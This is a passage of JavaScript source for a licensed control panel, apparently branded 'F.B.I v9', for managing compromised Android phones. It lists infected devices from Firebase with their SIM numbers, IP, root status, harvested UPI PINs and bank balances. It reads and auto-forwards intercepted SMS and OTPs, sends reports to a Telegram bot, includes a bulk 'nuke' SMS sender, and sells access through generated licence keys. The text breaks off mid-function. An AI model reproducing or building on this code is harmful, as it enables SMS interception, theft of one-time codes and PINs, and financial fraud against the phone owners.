/* ═══════════════════════════════════════════════════════════
   F.B.I v9 — SIM slot fix + Balance on cards + Clickable
   ═══════════════════════════════════════════════════════════ */

var CFG = window.SPECTER || {};
var FB_URL='',FB_KEY='';
var allDevices=[],selDev=null,activeDeviceUid=null;
var allMsgs=[],mfMode='all',amfMode='all';
var pinV={},pinC={},noteC={},otpNoteC={};
var usedDevices={},usedDevicesKey='fbi_used_devices';
var deviceSimMap={},deviceSimKey='fbi_device_sims';
var _msgCache={};
var gridFilter='all';
var deviceSearchQuery='';
var balanceCache={};

var mPoll=null,dPoll=null,aPoll=null,bgPoll=null;
var curMsgDev=null,lastKeys=new Set();
var amCache={},amFetch={};
var amAll=[],amFilt=[],amCount=0,amObs=null,amLoading=false,amLoaded=false,AM=80;

var nukeRunning=false,nukeSent=0,nukeFail=0,nukeTotal=0,_nukeActive=0,_nukeStartTime=0,_nukeStatsTmr=null;
var _nukePool=60;
var fbInstances=[];
var _mergeDebTimer=null,_lastMergeSig='';

var userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG||{}));
var blobId=null,cloudSaveTmr=null;
var tgRunning=false,tgPollLoop=false,tgLastUpdateId=0;
var forwardTracker={};
var tgDiagnostics={lastError:'',lastUpdate:0,updateCount:0,webhookInfo:'',botInfo:null};

var currentLicense=null,isAdmin=false,deviceFingerprint='';
var admUsersCache=null,admBlobId=null;

/* ═══════════ INIT ═══════════ */
loadUsedDevices();loadDeviceSims();loadForwardTracker();

function loadUsedDevices(){try{var r=localStorage.getItem(usedDevicesKey);if(r)usedDevices=JSON.parse(r)||{};}catch(e){}}
function saveUsedDevices(){try{localStorage.setItem(usedDevicesKey,JSON.stringify(usedDevices));}catch(e){}}
function loadDeviceSims(){try{var r=localStorage.getItem(deviceSimKey);if(r)deviceSimMap=JSON.parse(r)||{};}catch(e){}}
function saveDeviceSims(){try{localStorage.setItem(deviceSimKey,JSON.stringify(deviceSimMap));}catch(e){}}
function loadForwardTracker(){try{var r=localStorage.getItem('fbi_forward_tracker');if(r)forwardTracker=JSON.parse(r)||{};}catch(e){}}
function saveForwardTracker(){try{localStorage.setItem('fbi_forward_tracker',JSON.stringify(forwardTracker));}catch(e){}}

document.addEventListener('DOMContentLoaded',function(){
  if(checkSavedLicense()){showSetup();}
  setTimeout(function(){initCloudConfig();},100);
});

/* ═══════════ LICENSE ═══════════ */
function getDeviceFingerprint(){
  try{
    var c=localStorage.getItem(CFG.LS_DEVICE_FP);if(c)return c;
    var raw=navigator.userAgent+'|'+screen.width+'x'+screen.height+'|'+Intl.DateTimeFormat().resolvedOptions().timeZone;
    var h=0;for(var i=0;i<raw.length;i++){h=((h<<5)-h)+raw.charCodeAt(i);h=h&h;}
    var fp='FP-'+Math.abs(h).toString(36).toUpperCase()+'-'+Math.random().toString(36).slice(2,8).toUpperCase();
    localStorage.setItem(CFG.LS_DEVICE_FP,fp);return fp;
  }catch(e){return 'FP-UNKNOWN';}
}
async function loadKeysBlob(){
  try{
    var bk=CFG.KEYS_BLOB_ID||localStorage.getItem('fbi_keys_blob');
    if(!bk){
      var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({keys:{},createdAt:Date.now()}),signal:AbortSignal.timeout(10000)});
      if(!r.ok)return null;
      var loc=r.headers.get('Location')||r.headers.get('location');if(!loc)return null;
      var id=loc.split('/').pop();localStorage.setItem('fbi_keys_blob',id);
      return {blobId:id,data:{keys:{},createdAt:Date.now()}};
    }
    var r2=await fetch(CFG.BLOB_BASE+'/'+bk,{signal:AbortSignal.timeout(8000)});
    if(!r2.ok)return null;
    var data=await r2.json();
    return {blobId:bk,data:data||{keys:{}}};
  }catch(e){return null;}
}
async function saveKeysBlob(bid,data){
  try{var r=await fetch(CFG.BLOB_BASE+'/'+bid,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),signal:AbortSignal.timeout(8000)});return r.ok;}catch(e){return false;}
}
async function validateKey(){
  var input=document.getElementById('keyInput').value.trim().toUpperCase();
  var errEl=document.getElementById('loginErr');var infoEl=document.getElementById('loginInfo');
  errEl.style.display='none';infoEl.textContent='';
  if(!input){errEl.textContent='Enter a key';errEl.style.display='block';return;}
  deviceFingerprint=getDeviceFingerprint();
  infoEl.textContent='⏳ Validating...';infoEl.className='login-info';

  if(input===CFG.ADMIN_KEY){
    isAdmin=true;
    currentLicense={key:input,days:9999,expiresAt:Date.now()+9999*86400000,boundTo:deviceFingerprint,admin:true};
    try{localStorage.setItem(CFG.LS_LICENSE,JSON.stringify(currentLicense));}catch(e){}
    infoEl.textContent='👑 Admin access granted';infoEl.className='login-info';
    setTimeout(showSetup,700);return;
  }
  var blob=await loadKeysBlob();
  if(!blob){infoEl.textContent='⚠ Cloud offline';infoEl.className='login-info err';return;}
  var keys=blob.data.keys||{};
  var kd=keys[input];
  if(!kd){errEl.textContent='Invalid key';errEl.style.display='block';infoEl.textContent='';return;}
  var now=Date.now();
  if(kd.boundTo&&kd.boundTo!==deviceFingerprint){errEl.textContent='Key already used on another device';errEl.style.display='block';return;}
  if(kd.expiresAt&&kd.expiresAt<now){errEl.textContent='Key expired';errEl.style.display='block';return;}
  if(!kd.boundTo){
    kd.boundTo=deviceFingerprint;kd.activatedAt=now;kd.expiresAt=now+(kd.days||30)*86400000;keys[input]=kd;
    blob.data.keys=keys;await saveKeysBlob(blob.blobId,blob.data);
  }
  currentLicense={key:input,days:kd.days,expiresAt:kd.expiresAt,boundTo:deviceFingerprint,admin:false};
  try{localStorage.setItem(CFG.LS_LICENSE,JSON.stringify(currentLicense));}catch(e){}
  var daysLeft=Math.max(0,Math.ceil((kd.expiresAt-now)/86400000));
  infoEl.textContent='✅ Access granted · '+daysLeft+' days left';infoEl.className='login-info';
  setTimeout(showSetup,700);
}
function checkSavedLicense(){
  try{
    var s=localStorage.getItem(CFG.LS_LICENSE);if(!s)return false;
    var lic=JSON.parse(s);
    if(lic.admin){isAdmin=true;currentLicense=lic;return true;}
    if(!lic.expiresAt||lic.expiresAt<Date.now())return false;
    if(lic.boundTo!==getDeviceFingerprint())return false;
    currentLicense=lic;return true;
  }catch(e){return false;}
}
function showSetup(){
  document.getElementById('loginScreen').style.display='none';
  document.getElementById('setup').style.display='flex';
  var admBtn=document.getElementById('admBtn');
  if(admBtn)admBtn.style.display=isAdmin?'flex':'none';
}
function logout(){if(!confirm('Logout?'))return;try{localStorage.removeItem(CFG.LS_LICENSE);}catch(e){}location.reload();}


async function checkDailyReportDebug(){
  var el=document.getElementById('dailyReportStatus');
  var ownerId=userConfig.userId||'(not set)';
  var now=new Date();
  var dateKey=now.getFullYear()+'-'+(now.getMonth()+1)+'-'+now.getDate();
  var lastLocal='—',lastDb='—';
  try{lastLocal=localStorage.getItem('fbi_last_daily_report')||'never';}catch(e){}
  try{lastDb=await fbGet('fbi_meta/last_report')||'never';}catch(e){}
  var lines=[
    '🕐 Local time: '+now.toLocaleString(),
    '📅 Today: '+dateKey,
    '📤 Owner ID: '+ownerId,
    '💾 Last sent (local): '+lastLocal,
    '☁ Last sent (cloud): '+lastDb,
    '⏰ Next send: 1:00 AM daily',
    '📡 FB count: '+fbInstances.length,
    '📱 Device count: '+allDevices.length
  ];
  if(el){el.innerHTML=lines.join('<br>');el.className='settings-status on';}
  console.log('[DAILY] Status:',lines.join(' | '));
}


/* ═══════════ ADMIN ═══════════ */
async function openAdminPanel(){if(!isAdmin){toast('⚠ Admin only');return;}openM('adminModal');await admLoadUsers();admRenderUsers();}
async function admLoadUsers(){
  var el=document.getElementById('admUserList');
  if(el)el.innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading...</div>';
  var blob=await loadKeysBlob();
  if(!blob){if(el)el.innerHTML='<div class="bal-empty">Cloud offline</div>';return;}
  admBlobId=blob.blobId;admUsersCache=blob.data.keys||{};updateAdminStats();
}
function updateAdminStats(){
  if(!admUsersCache)return;
  var now=Date.now();var keys=Object.values(admUsersCache);
  document.getElementById('admTotalUsers').textContent=keys.length;
  document.getElementById('admActiveUsers').textContent=keys.filter(function(k){return k.boundTo&&(!k.expiresAt||k.expiresAt>now);}).length;
  document.getElementById('admExpiredUsers').textContent=keys.filter(function(k){return k.boundTo&&k.expiresAt&&k.expiresAt<=now;}).length;
}
function admRenderUsers(){
  var el=document.getElementById('admUserList');if(!el||!admUsersCache)return;
  var q=(document.getElementById('admSearch').value||'').toLowerCase();
  var now=Date.now();
  var arr=Object.keys(admUsersCache).map(function(k){return Object.assign({code:k},admUsersCache[k]);});
  arr.sort(function(a,b){return(b.createdAt||0)-(a.createdAt||0);});
  if(q)arr=arr.filter(function(k){return(k.code+' '+(k.note||'')).toLowerCase().indexOf(q)!==-1;});
  if(!arr.length){el.innerHTML='<div style="font-size:11px;color:var(--dim);text-align:center;padding:20px;">No keys</div>';return;}
  el.innerHTML=arr.map(function(k){
    var status,cls;
    if(!k.boundTo){status='UNUSED';cls='unused';}
    else if(k.expiresAt&&k.expiresAt<=now){status='EXPIRED';cls='expired';}
    else {var d=Math.ceil((k.expiresAt-now)/86400000);status=d+'d left';cls='active';}
    var expTxt=k.expiresAt?new Date(k.expiresAt).toLocaleDateString():'—';
    var actTxt=k.activatedAt?new Date(k.activatedAt).toLocaleDateString():'—';
    return '<div class="admin-user-card"><div class="admin-user-head"><div class="admin-user-key">'+k.code+'</div><div class="admin-key-status '+cls+'">'+status+'</div></div>'
      +'<div class="admin-user-meta">'+(k.note?'📝 '+esc(k.note)+' · ':'')+(k.days||30)+'d plan · Created: '+new Date(k.createdAt||0).toLocaleDateString()
      +(k.boundTo?' · Activated: '+actTxt+' · Expires: '+expTxt:' · Not used yet')+'</div>'
      +'<div class="admin-user-actions">'
      +'<button class="btn-extend" onclick="admExtendKey(\''+k.code+'\')">+30d</button>'
      +'<button class="btn-extend" onclick="admExtendKey(\''+k.code+'\',7)">+7d</button>'
      +'<button class="btn-reset" onclick="admResetKey(\''+k.code+'\')">🔓 Reset</button>'
      +'<button class="btn-remove" onclick="admDeleteKey(\''+k.code+'\')">🗑 Delete</button>'
      +'<button class="admin-key-copy" onclick="copyKeyCode(\''+k.code+'\',this)">📋</button>'
      +'</div></div>';
  }).join('');
}
async function admGenerateKeys(){
  if(!isAdmin)return;
  var days=parseInt(document.getElementById('admKeyDays').value)||30;
  var count=Math.max(1,Math.min(50,parseInt(document.getElementById('admKeyCount').value)||1));
  var note=document.getElementById('admKeyNote').value.trim();
  var blob=await loadKeysBlob();if(!blob){toast('⚠ Cloud offline');return;}
  var keys=blob.data.keys||{};
  for(var i=0;i<count;i++){var kk=genKey();while(keys[kk])kk=genKey();keys[kk]={days:days,createdAt:Date.now(),activatedAt:null,expiresAt:null,boundTo:null,note:note};}
  blob.data.keys=keys;
  if(await saveKeysBlob(blob.blobId,blob.data)){toast('🔑 '+count+' created');admUsersCache=keys;updateAdminStats();admRenderUsers();}
}
async function admExtendKey(code,days){
  if(!isAdmin||!admUsersCache)return;days=days||30;
  var k=admUsersCache[code];if(!k)return;var now=Date.now();
  if(!k.expiresAt||k.expiresAt<now)k.expiresAt=now+days*86400000;else k.expiresAt+=days*86400000;
  if(await saveKeysBlob(admBlobId,{keys:admUsersCache,createdAt:Date.now()})){toast('✅ Extended');updateAdminStats();admRenderUsers();}
}
async function admResetKey(code){
  if(!isAdmin||!admUsersCache)return;if(!confirm('Reset '+code+'?'))return;
  var k=admUsersCache[code];if(!k)return;
  k.boundTo=null;k.activatedAt=null;k.expiresAt=null;
  if(await saveKeysBlob(admBlobId,{keys:admUsersCache,createdAt:Date.now()})){toast('🔓 Reset');updateAdminStats();admRenderUsers();}
}
async function admDeleteKey(code){
  if(!isAdmin||!admUsersCache)return;if(!confirm('Delete?'))return;
  delete admUsersCache[code];
  if(await saveKeysBlob(admBlobId,{keys:admUsersCache,createdAt:Date.now()})){toast('🗑 Deleted');updateAdminStats();admRenderUsers();}
}
async function admSaveUsers(){
  if(!isAdmin||!admUsersCache)return;
  if(await saveKeysBlob(admBlobId,{keys:admUsersCache,createdAt:Date.now()}))toast('💾 Saved');
}
function genKey(){var c='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';var s=function(n){var x='';for(var i=0;i<n;i++)x+=c[Math.floor(Math.random()*c.length)];return x;};return 'FBI-'+s(4)+'-'+s(4)+'-'+s(4);}
function copyKeyCode(c,b){if(navigator.clipboard)navigator.clipboard.writeText(c).then(function(){b.textContent='✓';setTimeout(function(){b.textContent='📋';},1200);});}

/* ═══════════ CLOUD CONFIG ═══════════ */
async function initCloudConfig(){
  try{var c=localStorage.getItem(CFG.LS_CACHE);if(c)userConfig=Object.assign({},CFG.DEFAULT_CONFIG,JSON.parse(c));}catch(e){}
  try{
    blobId=localStorage.getItem(CFG.LS_BLOB);
    if(blobId){
      var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{signal:AbortSignal.timeout(8000)});
      if(r.ok){var rj=await r.json();if(rj&&typeof rj==='object'){userConfig=Object.assign({},CFG.DEFAULT_CONFIG,rj);cacheConfigLocal();updateCloudStatus('☁ Synced');}}
    } else await createCloudBlob();
  }catch(e){updateCloudStatus('⚠ Cloud offline');}
  fetchBotUsername();
  if(userConfig.botEnabled!==false&&userConfig.channelId)setTimeout(startTelegramBot,1200);
}
async function createCloudBlob(){
  try{
    var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(8000)});
    if(!r.ok)return;var loc=r.headers.get('Location')||r.headers.get('location');
    if(loc){blobId=loc.split('/').pop();localStorage.setItem(CFG.LS_BLOB,blobId);}
  }catch(e){}
}
function cacheConfigLocal(){try{localStorage.setItem(CFG.LS_CACHE,JSON.stringify(userConfig));}catch(e){}}
function updateCloudStatus(m,c){var el=document.getElementById('cloudStatus');if(el){el.textContent=m;el.className='settings-status '+(c||'');}}
async function saveCloudConfig(){
  cacheConfigLocal();if(!blobId){await createCloudBlob();return;}
  try{var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(8000)});if(r.ok)updateCloudStatus('☁ Saved '+new Date().toLocaleTimeString());}catch(e){}
}
function debouncedCloudSave(){if(cloudSaveTmr)clearTimeout(cloudSaveTmr);cloudSaveTmr=setTimeout(saveCloudConfig,800);}
function forceCloudSave(){saveCloudConfig();toast('☁ Save triggered');}
async function resetCloudConfig(){if(!confirm('Reset settings?'))return;userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));cacheConfigLocal();await saveCloudConfig();populateSettingsUI();toast('🗑 Reset');}

/* ═══════════ FIREBASE ═══════════ */
async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{signal:AbortSignal.timeout(15000)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}

function connect(){
  var url=document.getElementById('fbUrl').value.trim().replace(/\/+$/,'');
  if(!url){showErr('Enter Firebase URL');return;}
  FB_URL=url;
  document.getElementById('setup').style.display='none';
  document.getElementById('panel').style.display='flex';
  loadDevs();startDP();startBgForwardPoll();
  setTimeout(function(){fbRegisterPrimary();},500);
  if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,1000);
  setTimeout(loadFirebasesFromDb,2500);
  startDailyReportScheduler();
}

function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
function disconnect(){FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;stopMP();stopDP();stopAP();stopTelegramBot();stopBgForwardPoll();document.getElementById('panel').style.display='none';document.getElementById('setup').style.display='flex';}

/* ═══════════ POLLERS ═══════════ */
function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
  var d=await fbGet('clients');var nD=parseDevs(d);
  nD.forEach(function(d2){d2._fbId='primary';d2._fbLabel='Primary';d2._fbUrl=FB_URL;d2._fbKey=FB_KEY;});
  var prev=allDevices.filter(function(x){return(x._fbId||'primary')==='primary';}).length;
  allDevices=allDevices.filter(function(x){return(x._fbId||'primary')!=='primary';});
  allDevices=nD.concat(allDevices);
  if(nD.length!==prev||fbInstances.length>0){renderStats();renderGrid();}
  if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up){selDev=up;refreshDeviceModal();}}
}catch(e){}},20000);}
function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}
function startMP(id){stopMP();curMsgDev=id;pollMsgs(id);mPoll=setInterval(function(){if(selDev&&selDev.id===id)pollMsgs(id);},5000);}
function stopMP(){if(mPoll){clearInterval(mPoll);mPoll=null;}curMsgDev=null;}
function startAP(){stopAP();aPoll=setInterval(function(){if(document.getElementById('allMsgsModal').classList.contains('open'))pollAllFresh();},20000);}
function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'200px'});amObs.observe(s);}
function killObs(){if(amObs){amObs.disconnect();amObs=null;}}

function startBgForwardPoll(){stopBgForwardPoll();bgPoll=setInterval(bgForwardTick,5000);}
function stopBgForwardPoll(){if(bgPoll){clearInterval(bgPoll);bgPoll=null;}}
async function bgForwardTick(){
  if(!FB_URL||userConfig.forwardEnabled===false||!userConfig.myNumber)return;
  var dev=null;
  if(activeDeviceUid){var p=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===p[1]&&(x._fbId||'primary')===p[0];});}
  if(!dev)dev=allDevices.find(function(d){return d.status;});
  if(!dev||!dev.status)return;
  try{var msgs=await fetchMessagesForDevice(dev);if(msgs.length)checkAndForward(msgs,dev.id);}catch(e){}
}

/* ═══════════════════════════════════════════════════════════
   📱 DEVICE PARSING (v7-based — WORKING)
   ═══════════════════════════════════════════════════════════ */
async function loadDevs(){
  document.getElementById('deviceGrid').innerHTML='<div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading...</div>';
  try{
    var data=await fbGet('clients');
    var primDevs=parseDevs(data);
    primDevs.forEach(function(d){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;});
    primDevs.forEach(function(d){if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';});
    if(fbInstances.length>0)fbMergeAll();else{allDevices=applyStableOrder(primDevs);renderStats();renderGrid();}
  }catch(e){
    document.getElementById('deviceGrid').innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">⚠️</div><p>Failed: '+esc(e.message)+'</p></div>';
  }
}
function applyStableOrder(devs){
  if(!Array.isArray(devs)||!devs.length)return devs;
  var om={};try{om=JSON.parse(localStorage.getItem('fbi_device_order')||'{}');}catch(e){}
  var max=0;Object.keys(om).forEach(function(k){var v=parseInt(om[k],10);if(v>max)max=v;});
  devs.forEach(function(d){var n=parseInt(om[d.id],10);if(isNaN(n)){max+=1;n=max;om[d.id]=n;}d.deviceOrder=n;});
  devs.sort(function(a,b){return(a.deviceOrder||0)-(b.deviceOrder||0);});
  try{localStorage.setItem('fbi_device_order',JSON.stringify(om));}catch(e){}
  return devs;
}
function parseDT(dt){
  if(!dt)return 0;
  var s=String(dt).trim();
  if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');
  var d=new Date(s);return isNaN(d.getTime())?0:d.getTime();
}
function parseBatt(v){if(v==null)return NaN;return parseInt(String(v).replace('%','').trim(),10);}
function fmtPh(n){
  if(!n)return'—';
  var s=String(n).replace(/\D/g,'');
  if(s.length===10)return'+91'+s;
  if(s.startsWith('91')&&s.length===12)return'+'+s;
  if(s.length>0)return'+'+s;
  return'—';
}
function extractPhone(str){if(!str)return'';var m=String(str).match(/(\+?\d{10,15})/);return m?m[1]:'';}
function extractCarrier(str){if(!str)return'';return String(str).replace(/\+?\d{10,15}/g,'').trim();}

/* ── MAIN PARSER ── */
function parseDevs(data){
  var devs=[];
  if(!data||typeof data!=='object')return devs;
  Object.entries(data).forEach(function(kv){
    var id=kv[0],d=kv[1];
    if(!d||typeof d!=='object')return;

    // Phone number
    var mobRaw=d.mobNo||d.phoneNumber||d.number||'';
    var mobPhone=extractPhone(mobRaw);
    var mobCarrier=extractCarrier(mobRaw);

    // ── SIMs ──
    var sims=[];
    if(d.sims&&typeof d.sims==='object'){
      var simsRaw=Array.isArray(d.sims)?d.sims:Object.values(d.sims);
      simsRaw=simsRaw.filter(function(s){return s&&typeof s==='object';});
      sims=simsRaw.map(function(s){
        // Handle simSlotIndex 0/1 (index from 0)
        var slotIdx=s.simSlotIndex!==undefined?s.simSlotIndex:(s.slotIndex!==undefined?s.slotIndex:(s.slot!==undefined?s.slot:0));
        var slotNum=parseInt(slotIdx,10);if(isNaN(slotNum))slotNum=0;
        return {
          carrierName:s.carrierName||s.carrier||s.operator||'—',
          phoneNumber:s.phoneNumber||s.phone||s.number||'',
          simSlotIndex:slotNum  // keep numeric
        };
      });
      // Sort by slot
      sims.sort(function(a,b){return a.simSlotIndex-b.simSlotIndex;});
    }
    // Fallback: if no sims but mobNo exists, create one
    if(!sims.length&&mobPhone){
      sims.push({carrierName:mobCarrier||'—',phoneNumber:mobPhone,simSlotIndex:0});
    }

    var lastMsg=d.messageText||'';
    var smsSent=parseInt(d.smsSent1,10)||0;
    var batt=d.battery;

    devs.push({
      id:id,
      deviceId:d.deviceId||d.targetDeviceId||id,
      fbKey:id,
      name:d.modelName||d.model||d.deviceName||mobCarrier||id.substring(0,8),
      batteryRaw:batt!=null?batt:'—',
      batteryNum:parseBatt(batt),
      status:!!d.status,
      mobNo:mobPhone?fmtPh(mobPhone):'—',
      mobRaw:mobRaw,
      carrier:mobCarrier||(sims[0]&&sims[0].carrierName)||'—',
      ip:d.ip_address||d.ip||'—',
      android:d.androidV||'—',
      storage:d.storage||'—',
      note:d.note||'',
      joined:d.joined||(d.lastMessageTime?new Date(d.lastMessageTime).toLocaleString():'—'),
      jTs:parseDT(d.joined)||d.lastMessageTime||0,
      sdkV:d.sdkV||'—',
      cpuArch:d.cpu_arch||'—',
      isRoot:!!d.isRoot,
      isSdCard:!!d.isSdCard,
      serviceProvider:d.service_provider||mobCarrier||'—',
      upipin:d.upipin||null,
      sims:sims,
      liked:!!d.like,
      lastMessage:lastMsg,
      lastMessageTime:d.lastMessageTime||0,
      smsSent:smsSent,
      raw:d
    });
  });
  devs.sort(function(a,b){if(a.status!==b.status)return b.status-a.status;return(b.jTs||0)-(a.jTs||0);});
  return devs;
}

/* ═══════════ STATS ═══════════ */
var _sc={tot:0,on:0,off:0,sims:0,upi:0};
function _rebuildSC(){var on=0,off=0,sims=0,upi=0;for(var i=0;i<allDevices.length;i++){var d=allDevices[i];if(d.status)on++;else off++;sims+=d.sims.length;if(d.upipin||pinC[d.id])upi++;}_sc={tot:allDevices.length,on:on,off:off,sims:sims,upi:upi};}
function renderStats(){
  _rebuildSC();
  var e;
  e=document.getElementById('tpTot');if(e)e.textContent=_sc.tot+' total';
  e=document.getElementById('tpOn');if(e)e.textContent=_sc.on+' online';
  e=document.getElementById('tpOff');if(e)e.textContent=_sc.off+' offline';
}

/* ═══════════ GRID + SEARCH ═══════════ */
function filterDeviceGrid(){deviceSearchQuery=(document.getElementById('deviceSearch').value||'').trim().toLowerCase();renderGrid();}
function _deviceMatches(d){
  if(!deviceSearchQuery)return true;
  var hay=[d.name,d.id,d.deviceId,d.mobNo,d.mobRaw,d.carrier,d.ip,d.serviceProvider,d.note,d.lastMessage,d.storage];
  (d.sims||[]).forEach(function(s){hay.push(s.phoneNumber||'');hay.push(s.carrierName||'');});
  return hay.join(' ').toLowerCase().indexOf(deviceSearchQuery)!==-1;
}

/* Get device balance (total) */
function getDeviceTotalBalance(devId){
  var bal=balanceCache[devId];if(!bal||!bal.accounts)return null;
  var total=0,hasBal=false;
  bal.accounts.forEach(function(a){if(a.bal!=null){total+=a.bal;hasBal=true;}});
  if(!hasBal)return null;
  return {total:total,accounts:bal.accounts.length};
}

function renderGrid(){
  var grid=document.getElementById('deviceGrid');
  var filtered=allDevices.filter(function(d){
    if(gridFilter==='online'&&!d.status)return false;
    if(gridFilter==='offline'&&d.status)return false;
    if(gridFilter==='pin'&&!d.upipin&&!pinC[d.id])return false;
    if(gridFilter==='balance'&&!balanceCache[d.id])return false;
    if(!_deviceMatches(d))return false;
    return true;
  });
  if(!filtered.length){grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">🔍</div><p>No devices match</p></div>';return;}
  var html='';
  filtered.forEach(function(d,i){
    var uid=(d._fbId||'primary')+'|||'+d.id;
    var isActive=(activeDeviceUid===uid);
    var bv=d.batteryNum;
    var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
    var num=d.mobNo!=='—'?d.mobNo:(d.sims[0]?fmtPh(d.sims[0].phoneNumber||''):'—');
    var note=noteC[d.id]||d.note||'';
    var devBal=getDeviceTotalBalance(d.id);
    var balTag=devBal?'<span class="dc-badge" style="background:rgba(6,214,160,.18);color:var(--mint);font-weight:800">💰 ₹'+Number(devBal.total).toLocaleString('en-IN',{maximumFractionDigits:0})+'</span>':'';
    var simCount=d.sims.length;
    html+='<div class="device-card '+(d.status?'online':'')+' '+(isActive?'active':'')+'" onclick="openDeviceModal(\''+esc(uid)+'\')" style="animation-delay:'+(i*0.03)+'s">'
      +'<div class="dc-top"><div class="dc-icon">📱<div class="dot '+(d.status?'on':'off')+'"></div></div>'
      +'<div class="dc-meta"><div class="dc-name">'+esc(d.name)+'</div><div class="dc-id">#'+(d.deviceOrder||(i+1))+' · '+esc(String(d.deviceId).substring(0,14))+'…</div></div>'
      +(isActive?'<div class="dc-active-pill">ACTIVE</div>':'')+'</div>'
      +'<div class="dc-stats">'
        +'<div class="dc-stat"><div class="dc-stat-lbl">Battery</div><div class="dc-stat-val" style="color:'+bc+'">'+(isNaN(bv)?d.batteryRaw:bv+'%')+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">SIMs</div><div class="dc-stat-val" style="color:var(--gold2)">'+simCount+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">SMS</div><div class="dc-stat-val" style="color:var(--lilac)">'+(d.smsSent||0)+'</div></div>'
      +'</div>'
      +'<div class="dc-num">'+esc(num)+'</div>'
      +(d.carrier&&d.carrier!=='—'?'<div style="font-size:10px;color:var(--sky);text-align:center;margin-bottom:6px">📶 '+esc(d.carrier)+'</div>':'')
      +(note?'<div class="dc-note">📝 '+esc(note)+'</div>':'')
      +'<div class="dc-footer"><div class="dc-badges">'
        +(d.upipin||pinC[d.id]?'<span class="dc-badge pin">💳 PIN</span>':'')
        +balTag
        +(d.status?'<span class="dc-badge" style="background:rgba(6,214,160,.14);color:var(--mint)">● ON</span>':'<span class="dc-badge" style="background:rgba(244,63,94,.14);color:var(--rose)">● OFF</span>')
      +'</div><div class="dc-conn">#'+(d.deviceOrder||(i+1))+'</div></div></div>';
  });
  grid.innerHTML=html;
}

function toggleFilterMenu(e){if(e)e.stopPropagation();document.getElementById('filterMenu').classList.toggle('open');}
function setGridFilter(f){
  gridFilter=f;
  var labels={all:'All',online:'Online',offline:'Offline',pin:'PIN',balance:'Bal'};
  document.getElementById('filterLabel').textContent=labels[f]||'All';
  document.querySelectorAll('.filter-menu > div').forEach(function(el){el.classList.toggle('active',el.dataset.f===f);});
  document.getElementById('filterMenu').classList.remove('open');renderGrid();
}
document.addEventListener('click',function(e){var m=document.getElementById('filterMenu');if(m&&!e.target.closest('.filter-wrap'))m.classList.remove('open');});

/* ═══════════ DEVICE MODAL ═══════════ */
function openDeviceModal(uid){
  var p=uid.split('|||');
  var d=allDevices.find(function(x){return x.id===p[1]&&(x._fbId||'primary')===p[0];});
  if(!d)d=allDevices.find(function(x){return x.id===p[1];});
  if(!d){toast('⚠ Not found');return;}
  selDev=d;activeDeviceUid=uid;
  try{localStorage.setItem(CFG.LS_ACTIVE||'fbi_active_device',uid);}catch(e){}
  renderGrid();
  document.getElementById('deviceModal').classList.add('open');
  document.body.style.overflow='hidden';
  refreshDeviceModal();
  var ck=uid;var cached=_msgCache[ck];
  if(cached){allMsgs=cached;lastKeys=new Set(cached.map(function(m){return m.key;}));updCnt();filterActiveMsgs();_silentRefresh(selDev);}
  else{document.getElementById('dmMsgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}
  updOtpNoteBox();
  refreshDeviceBalances(d);
}

/* Get SIM by slot index (0=first, 1=second) */
function getSimBySlot(dev,slotIdx){
  if(!dev.sims||!dev.sims.length)return null;
  var found=null;
  dev.sims.forEach(function(s){if(s.simSlotIndex===slotIdx)found=s;});
  if(!found)found=dev.sims[slotIdx]||null;
  return found;
}

function refreshDeviceModal(){
  if(!selDev)return;
  var d=selDev;
  document.getElementById('dmName').textContent=d.name;
